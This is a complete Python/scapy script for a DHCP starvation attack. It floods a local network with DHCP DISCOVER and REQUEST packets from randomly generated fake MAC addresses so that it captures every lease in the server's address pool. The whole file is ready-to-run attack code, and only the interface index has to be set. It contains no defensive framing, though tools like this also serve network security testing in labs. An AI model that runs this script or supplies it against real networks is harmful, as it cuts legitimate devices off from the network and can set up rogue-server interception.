import random
import time
from scapy.all import DHCP, BOOTP, IP, UDP, Ether, sniff, sendp, get_if_hwaddr, conf



INTERFACE_INDEX = 25  # --- Change this to the desired interface index ---

# the interface can be found using the command "ip link show" in Linux, and the index is the number before the colon (e.g., "25: eth0").
# the interface can be found in windows using the command "Get-NetIPInterface | Sort-Object InterfaceIndex | Format-Table InterfaceIndex, InterfaceAlias, AddressFamily".
INTERFACE_NAME = None
for iface in conf.ifaces.values():
    if getattr(iface, 'index', -1) == INTERFACE_INDEX:
        INTERFACE_NAME = iface.name
        break

if not INTERFACE_NAME:
    print(f"[!] Error: Interface with index {INTERFACE_INDEX} not found.")
    exit(1)

REAL_MAC = get_if_hwaddr(INTERFACE_NAME)
SEND_RATE = 0.3  # Adjust rate in which the packets are sent, if needed
active_dhcp_transactions = {}

def generate_Random_MAC():
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255), 
        random.randint(0, 255), 
        random.randint(0, 255)
    )

def send_DHCP_discover(iface_name):
    false_mac = generate_Random_MAC()
    xid = random.randint(1, 4294967295)
    
    active_dhcp_transactions[xid] = false_mac
    mac_false_bytes = bytes.fromhex(false_mac.replace(":", ""))
    
    eth = Ether(src=REAL_MAC, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    
    bootp = BOOTP(op=1, chaddr=mac_false_bytes, xid=xid, flags=0x8000)
    dhcp = DHCP(options=[("message-type", "discover"), ("end")])
    
    packet = eth / ip / udp / bootp / dhcp
    sendp(packet, iface=iface_name, verbose=False)
    print(f"[*] DISCOVER sent -> False MAC: {false_mac} | XID: {xid}")

def process_packet(pkt):
    if not pkt.haslayer(DHCP):
        return

    xid = pkt[BOOTP].xid

    if xid in active_dhcp_transactions:
        false_mac = active_dhcp_transactions[xid]
        offered_ip = pkt[BOOTP].yiaddr
        
        message_type = None
        server_id = "255.255.255.255"
        
        
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and len(opt) >= 2:
                if opt[0] == "message-type":
                    message_type = opt[1]
                elif opt[0] == "server_id":
                    server_id = opt[1]

        
        if message_type == 2:
            print(f"[+] Received OFFER -> IP: {offered_ip} for MAC: {false_mac}. Sending REQUEST...")
            
            eth = Ether(src=REAL_MAC, dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src="0.0.0.0", dst="255.255.255.255")
            udp = UDP(sport=68, dport=67)
            
            mac_falso_bytes = bytes.fromhex(false_mac.replace(":", ""))
            bootp = BOOTP(op=1, chaddr=mac_falso_bytes, xid=xid, flags=0x8000)
            dhcp = DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", offered_ip),
                ("server_id", server_id),
                ("end")
            ])
            
            packet = eth / ip / udp / bootp / dhcp
            sendp(packet, iface=INTERFACE_NAME, verbose=False)
            
        
        elif message_type == 5:
            print(f"[✓] LEASE ACQUIRED -> The IP {offered_ip} now belongs to the MAC {false_mac}!")
            if xid in active_dhcp_transactions:
                del active_dhcp_transactions[xid]

def main():
    print(f"Starting DHCP Starvation Attack on Interface: {INTERFACE_NAME}")
    print(f"Origin MAC: {REAL_MAC}\n")
    
    from threading import Thread
    sniffer_thread = Thread(target=lambda: sniff(
        iface=INTERFACE_NAME,
        filter="udp and src port 67 and dst port 68",
        prn=process_packet,
        store=0
    ), daemon=True)
    sniffer_thread.start()

    try:
        while True:
            send_DHCP_discover(INTERFACE_NAME)
            time.sleep(SEND_RATE)
    except KeyboardInterrupt:
        print("\n[-] Execution interrupted.")

if __name__ == "__main__":
    main()